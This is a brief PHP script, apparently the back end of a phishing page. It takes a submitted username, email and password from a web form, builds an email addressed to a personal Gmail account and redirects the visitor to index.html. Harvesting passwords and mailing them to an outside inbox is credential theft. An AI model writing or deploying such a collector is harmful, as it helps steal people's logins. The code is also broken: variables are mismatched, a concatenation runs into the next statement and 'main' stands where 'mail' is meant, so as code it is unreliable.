<?php
$name = $_POST['usename'];
$visitor_email = $_POST['E-mail'];
$subject = $_POST['passoword'];

$email_from = 'goswamirahul556454@gmail.com';

$email_subject = 'New Form Submission';

$email_body = "User Name: $username.\n" .
    "User Email: $visitor_email.\n" .
    "Subject: $password.\n" .

$to = 'goswamirahul5564541@gmail.com';

$headers = "From: $email_from \r\n";

$headers .= "Reply-To: $visitor_email \r\n";


main($to, $email_subject, $email_body, $headers);

header("Location: index.html");
?>
